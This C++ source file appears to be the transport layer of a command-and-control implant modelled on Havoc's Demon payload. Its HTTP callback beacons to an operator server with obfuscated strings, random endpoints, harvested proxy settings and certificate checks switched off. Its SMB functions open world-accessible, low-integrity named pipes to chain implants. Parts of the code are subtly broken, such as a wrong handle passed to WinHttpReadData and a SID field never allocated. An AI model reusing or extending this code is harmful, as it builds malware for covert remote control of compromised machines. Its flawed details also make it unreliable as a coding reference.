#include <core/include/network.hpp>
namespace Http {

    BOOL SetHeaders(_request *request) {
        HEXANE


        if (Ctx->Transport.http->headers) {

            DYN_ARRAY_EXPR(
                n_headers, Ctx->Transport.http->headers,
                header = Ctx->Transport.http->headers[n_headers];

            if (!Ctx->win32.WinHttpAddRequestHeaders(request->req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                success = false;
                break;
            })
        }

        return success;
    }

    VOID HttpDownload(_request *request, _stream **stream) {
        HEXANE

        void *buffer   = { };
        void *download = { };

        uint32_t read  = 0;
        uint32_t total = 0;
        uint32_t length = 0;
        do {
            if (!(Ctx->win32.WinHttpQueryDataAvailable(request->req_handle, R_CAST(LPDWORD, &length)))) {
                return_defer(ntstatus);
            }
            if (!buffer) {
                buffer = x_malloc(length + 1);
            }

            if (!download) {
                download = x_malloc(length + 1);
            } else {
                download = x_realloc(download, total + length + 1);
            }

            x_memset(buffer, 0, length + 1);
            if (!Ctx->win32.WinHttpReadData(request, buffer, length, R_CAST(LPDWORD, &read))) {
                return_defer(ntstatus);
            }

            x_memcpy(B_PTR(download) + total, buffer, read);
            ZeroFreePtr(buffer, read);
            total += read;

        } while (length > 0);

        (*stream) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
        (*stream)->Buffer = download;
        (*stream)->Length = total;

        defer:
    }

    _request* CreateRequestContext() {
        HEXANE
        // creates global http session for context

        _request *request = R_CAST(_request*, x_malloc(sizeof(_request)));
        uint32_t n_endpoint = 0;

        if (!Ctx->Transport.http->handle) {
            if (!(Ctx->Transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->Transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
                return_defer(ntstatus);
            }
        }

        if (!(request->conn_handle = Ctx->win32.WinHttpConnect(Ctx->Transport.http->handle, Ctx->Transport.http->address, Ctx->Transport.http->port, 0))) {
            return_defer(ntstatus);
        }

        n_endpoint          = Utils::Random::RandomNumber32();
        request->endpoint   = Ctx->Transport.http->endpoints[n_endpoint % Ctx->Transport.http->n_endpoints];

        Ctx->Transport.http->flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
        if (Ctx->Transport.bSSL) {
            Ctx->Transport.http->flags |= WINHTTP_FLAG_SECURE;
        }

        if (!(request->req_handle = Ctx->win32.WinHttpOpenRequest(request->conn_handle, Ctx->Transport.http->method, request->endpoint, nullptr, nullptr, nullptr, Ctx->Transport.http->flags))) {
            return_defer(ntstatus);
        }

        defer:
        if (ntstatus != ERROR_SUCCESS) {
            if (request) {
                x_free(request);
            }
        }

        return request;
    }

    _proxy_context* CreateProxyContext(_request *request) {
        HEXANE

        // _proxy_context is a temporary store and can be discarded
        _proxy_context *proxy_ctx = R_CAST(_proxy_context*, x_malloc(sizeof(_proxy_context)));

        if (Ctx->Transport.bProxy) {
            proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
            proxy_ctx->proxy_info.lpszProxy     = Ctx->Transport.http->proxy->address;

            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
                return_defer(ntstatus);
            }

            if (Ctx->Transport.http->proxy->username && Ctx->Transport.http->proxy->password) {
                if (
                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_USERNAME, Ctx->Transport.http->proxy->username, x_wcslen(Ctx->Transport.http->proxy->username)) ||
                    !Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->Transport.http->proxy->password, x_wcslen(Ctx->Transport.http->proxy->password))) {
                    return_defer(ntstatus);
                }
            }
        } else if (!Ctx->Transport.bEnvProxyCheck) {
            proxy_ctx->autoproxy.dwFlags                = WINHTTP_AUTOPROXY_AUTO_DETECT;
            proxy_ctx->autoproxy.dwAutoDetectFlags      = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
            proxy_ctx->autoproxy.lpszAutoConfigUrl      = nullptr;
            proxy_ctx->autoproxy.lpvReserved            = nullptr;
            proxy_ctx->autoproxy.dwReserved             = 0;
            proxy_ctx->autoproxy.fAutoLogonIfChallenged = TRUE;

            if (Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->handle, request->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info)) {
                Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);
                Ctx->Transport.EnvProxy     = x_malloc(Ctx->Transport.EnvProxyLen);

                x_memcpy(Ctx->Transport.EnvProxy, &proxy_ctx->proxy_info, Ctx->Transport.EnvProxyLen);

            } else {
                if (Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser(&proxy_ctx->proxy_config)) {
                    if (proxy_ctx->proxy_config.lpszProxy != nullptr && x_wcslen(proxy_ctx->proxy_config.lpszProxy) != 0) {
                        proxy_ctx->proxy_info.dwAccessType      = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                        proxy_ctx->proxy_info.lpszProxy         = proxy_ctx->proxy_config.lpszProxy;
                        proxy_ctx->proxy_info.lpszProxyBypass   = proxy_ctx->proxy_config.lpszProxyBypass;
                        Ctx->Transport.EnvProxyLen              = sizeof(WINHTTP_PROXY_INFO);

                        Ctx->Transport.EnvProxy = x_malloc(Ctx->Transport.EnvProxyLen);
                        x_memcpy(Ctx->Transport.EnvProxy, &proxy_ctx->proxy_info, Ctx->Transport.EnvProxyLen);

                        proxy_ctx->proxy_config.lpszProxy       = nullptr;
                        proxy_ctx->proxy_config.lpszProxyBypass = nullptr;

                    } else if (proxy_ctx->proxy_config.lpszAutoConfigUrl != nullptr && x_wcslen(proxy_ctx->proxy_config.lpszAutoConfigUrl) != 0) {
                        proxy_ctx->autoproxy.dwFlags            = WINHTTP_AUTOPROXY_CONFIG_URL;
                        proxy_ctx->autoproxy.lpszAutoConfigUrl  = proxy_ctx->proxy_config.lpszAutoConfigUrl;
                        proxy_ctx->autoproxy.dwAutoDetectFlags  = 0;

                        Ctx->win32.WinHttpGetProxyForUrl(Ctx->Transport.http->handle, request->endpoint, &proxy_ctx->autoproxy, &proxy_ctx->proxy_info);
                        Ctx->Transport.EnvProxyLen  = sizeof(WINHTTP_PROXY_INFO);

                        Ctx->Transport.EnvProxy = x_malloc(Ctx->Transport.EnvProxyLen);
                        x_memcpy(Ctx->Transport.EnvProxy, &proxy_ctx->proxy_info, Ctx->Transport.EnvProxyLen);
                    }
                }
            }
            Ctx->Transport.bEnvProxyCheck = true;
        }

        if (Ctx->Transport.EnvProxy) {
            if (!Ctx->win32.WinHttpSetOption(request, WINHTTP_OPTION_PROXY, Ctx->Transport.EnvProxy, Ctx->Transport.EnvProxyLen)) {
                return_defer(ntstatus);
            }
        }

        defer:
        if (ntstatus != ERROR_SUCCESS) {
            if (proxy_ctx) {
                x_free(proxy_ctx);
                proxy_ctx = nullptr;
            }
        }

        return proxy_ctx;
    }

    VOID HttpCallback(const _stream *const out, _stream **in) {
        HEXANE
        // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L21

        _proxy_context *proxy_ctx   = { };
        _request *request           = { };

        wchar_t *header     = { };
        uint32_t status     = 0;
        uint32_t n_headers  = 0;
        uint32_t n_status   = sizeof(uint32_t);

        Ctx->Transport.http->method = OBFW(L"GET"); // todo: dynamic method selection/context-based?

        if (
            !(request = CreateRequestContext()) ||
            !(proxy_ctx = CreateProxyContext(request)) ||
            !SetHeaders(request)) {
            return_defer(ntstatus);
        }

        if (Ctx->Transport.bSSL) {
            Ctx->Transport.http->flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;

            if (!Ctx->win32.WinHttpSetOption(request->req_handle, WINHTTP_OPTION_SECURITY_FLAGS, &Ctx->Transport.http->flags, sizeof(ULONG))) {
                return_defer(ntstatus);
            }
        }

        if (Ctx->Transport.http->headers) {
            // a pointless macro but it looks nicer/slightly less typing
            DYN_ARRAY_EXPR(
                n_headers, Ctx->Transport.http->headers,
                header = Ctx->Transport.http->headers[n_headers];

            if (!Ctx->win32.WinHttpAddRequestHeaders(request->req_handle, header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                return_defer(ntstatus);
            })
        }

        if (
            !Ctx->win32.WinHttpSendRequest(request->req_handle, nullptr, 0, out->Buffer, out->Length, out->Length, 0) ||
            !Ctx->win32.WinHttpReceiveResponse(request->req_handle, nullptr)) {
            return_defer(ntstatus);
        }

        if (
            !Ctx->win32.WinHttpQueryHeaders(request->req_handle, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, nullptr, &status, R_CAST(LPDWORD, &n_status), nullptr)) {
            return_defer(ntstatus);
        }
        if (status != HTTP_STATUS_OK) {
            return_defer(status);
        }

        HttpDownload(request, in);

        defer:
        if (request) {
            if (request->req_handle) { Ctx->win32.WinHttpCloseHandle(request->req_handle); }
            if (request->conn_handle) { Ctx->win32.WinHttpCloseHandle(request->conn_handle); }
        }
        if (proxy_ctx) {
            if (proxy_ctx->proxy_config.lpszProxy) { x_free(proxy_ctx->proxy_config.lpszProxy); }
            if (proxy_ctx->proxy_config.lpszProxyBypass) { x_free(proxy_ctx->proxy_config.lpszProxyBypass); }
            if (proxy_ctx->proxy_config.lpszAutoConfigUrl) { x_free(proxy_ctx->proxy_config.lpszAutoConfigUrl); }
        }
    }
}

namespace Smb {

    VOID SmbContextDestroy(const PSMB_PIPE_SEC_ATTR SmbSecAttr) {
        HEXANE

        if (SmbSecAttr->Sid) {
            Ctx->win32.FreeSid(SmbSecAttr->Sid);
            SmbSecAttr->Sid = nullptr;
        }
        if (SmbSecAttr->SidLow) {
            Ctx->win32.FreeSid(SmbSecAttr->SidLow);
            SmbSecAttr->SidLow = nullptr;
        }
        if (SmbSecAttr->pAcl) {
            x_free(SmbSecAttr->pAcl);
        }
        if (SmbSecAttr->SecDesc) {
            x_free(SmbSecAttr->SecDesc);
        }
    }

    VOID SmbContextInit(SMB_PIPE_SEC_ATTR *const SmbSecAttr, PSECURITY_ATTRIBUTES SecAttr) {
        HEXANE

        SID_IDENTIFIER_AUTHORITY sid_auth = SECURITY_WORLD_SID_AUTHORITY;
        SID_IDENTIFIER_AUTHORITY sid_label = SECURITY_MANDATORY_LABEL_AUTHORITY;

        EXPLICIT_ACCESSA access = { };
        PACL acl = { };

        x_memset(SmbSecAttr, 0, sizeof(SMB_PIPE_SEC_ATTR));
        x_memset(SecAttr, 0, sizeof(PSECURITY_ATTRIBUTES));

        if (!Ctx->win32.AllocateAndInitializeSid(&sid_auth, 1, SMB_SID_SINGLE_WORLD_SUBAUTHORITY, &SmbSecAttr->SidLow)) {
            return_defer(ERROR_INVALID_SID);
        }

        access.grfAccessPermissions = SPECIFIC_RIGHTS_ALL | STANDARD_RIGHTS_ALL;
        access.grfInheritance = NO_INHERITANCE;
        access.grfAccessMode = SET_ACCESS;

        access.Trustee.TrusteeForm = TRUSTEE_IS_SID;
        access.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
        access.Trustee.ptstrName = S_CAST(LPSTR, SmbSecAttr->Sid);

        if (
            !(Ctx->win32.SetEntriesInAclA(1, &access, nullptr, &acl)) ||
            !Ctx->win32.AllocateAndInitializeSid(&sid_label, 1, SMB_RID_SINGLE_MANDATORY_LOW, &SmbSecAttr->SidLow)) {
            return_defer(ERROR_INVALID_SID);
        }

        if (!(SmbSecAttr->pAcl = S_CAST(PACL, x_malloc(MAX_PATH)))) {
            return_defer(ERROR_NOT_ENOUGH_MEMORY);
        }

        if (
            !Ctx->win32.InitializeAcl(SmbSecAttr->pAcl, MAX_PATH, ACL_REVISION_DS) ||
            !Ctx->win32.AddMandatoryAce(SmbSecAttr->pAcl, ACL_REVISION_DS, NO_PROPAGATE_INHERIT_ACE, 0, SmbSecAttr->SidLow)) {
            return_defer(ERROR_NO_ACE_CONDITION);
        }

        if (!(SmbSecAttr->SecDesc = x_malloc(SECURITY_DESCRIPTOR_MIN_LENGTH))) {
            return_defer(ERROR_INVALID_SECURITY_DESCR);
        }

        if (
            !Ctx->win32.InitializeSecurityDescriptor(SmbSecAttr->SecDesc, SECURITY_DESCRIPTOR_REVISION) ||
            !Ctx->win32.SetSecurityDescriptorDacl(SmbSecAttr->SecDesc, TRUE, acl, FALSE) ||
            !Ctx->win32.SetSecurityDescriptorSacl(SmbSecAttr->SecDesc, TRUE, SmbSecAttr->pAcl, FALSE)) {
            return_defer(ERROR_INVALID_SECURITY_DESCR);
        }

        defer:
        if (ntstatus == ERROR_SUCCESS) {
            SecAttr->lpSecurityDescriptor = SmbSecAttr->SecDesc;
            SecAttr->nLength = sizeof(SECURITY_ATTRIBUTES);
            SecAttr->bInheritHandle = FALSE;
        }
    }

    BOOL PipeRead(_stream *in, HANDLE handle) {
        HEXANE

        uint32_t read = 0;
        uint32_t total = 0;

        do {
            if (!Ctx->win32.ReadFile(handle, B_PTR(in->Buffer) + total, MIN((in->Length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &read), nullptr)) {
                if (ntstatus == ERROR_NO_DATA) {
                    return false;
                }
            }

            total += read;
        } while (total < in->Length);
        return true;
    }

    BOOL PipeWrite(_stream *out, HANDLE handle) {
        HEXANE

        uint32_t total = 0;
        uint32_t write = 0;

        do {
            if (!Ctx->win32.WriteFile(handle, B_PTR(out->Buffer) + total, MIN((out->Length - total), PIPE_BUFFER_MAX), R_CAST(LPDWORD, &write), nullptr)) {
                return false;
            }

            total += write;
        } while (total < out->Length);
        return true;
    }

    VOID PeerConnectIngress (_stream *out, _stream **in) {
        HEXANE

        HANDLE handle               = Ctx->Config.IngressPipename;
        SMB_PIPE_SEC_ATTR smb_attr  = { };
        SECURITY_ATTRIBUTES sec_attr = { };

        ULONG n_bytes   = 0;
        ULONG msg_length = 0;
        ULONG peer_id   = 0;

        if (!handle) {
            SmbContextInit(&smb_attr, &sec_attr);
            if (!(handle = Ctx->win32.CreateNamedPipeW(Ctx->Config.IngressPipename, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, PIPE_BUFFER_MAX, PIPE_BUFFER_MAX, 0, &sec_attr))) {
                return_defer(ntstatus);
            }

            SmbContextDestroy(&smb_attr);
            if (!Ctx->win32.ConnectNamedPipe(handle, nullptr)) {
                return_defer(ERROR_BROKEN_PIPE);
            }
        }

        if (!Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &n_bytes, nullptr)) {
            return_defer(ntstatus);
        }

        if (n_bytes > sizeof(uint32_t) * 2) {
            msg_length = n_bytes;

            if (!Ctx->win32.ReadFile(handle, &peer_id, sizeof(uint32_t), &n_bytes, nullptr)) {
                return_defer(ntstatus);
            }
            if (Ctx->Session.PeerId != peer_id) {
                return_defer(ERROR_NOT_READY);
            }

            (*in) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
            (*in)->Buffer = x_malloc(msg_length);
            (*in)->Length = msg_length;

            PipeRead(*in, handle);

        } else {
            return_defer(ERROR_INSUFFICIENT_BUFFER);
        }

        if (out) {
            if (!PipeWrite(out, handle)) {
                return_defer(ERROR_WRITE_FAULT);
            }
        }

        defer:
    }

    VOID PeerConnectEgress(_stream *out, _stream **in) {
        HEXANE

        auto handle = Ctx->Config.EgressHandle;
        auto pipename = Ctx->Config.EgressPipename;

        if (!(handle = Ctx->win32.CreateFileW(pipename, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr))) {
            if (handle == INVALID_HANDLE_VALUE && ntstatus == ERROR_PIPE_BUSY) {

                if (!Ctx->win32.WaitNamedPipeW(pipename, 5000)) {
                    return_defer(ERROR_NOT_READY);
                }
            } else {
                return_defer(ntstatus);
            }
        }

        if (Ctx->win32.PeekNamedPipe(handle, nullptr, 0, nullptr, &(*in)->Length, nullptr)) {
            if ((*in)->Length > 0) {

                if (!PipeRead(*in, handle)) {
                    return_defer(ntstatus);
                }
            } else {
                return_defer(ERROR_INSUFFICIENT_BUFFER);
            }
        }
        if (!PipeWrite(out, handle)) {
            return_defer(ntstatus);
        }

        defer:
    }
}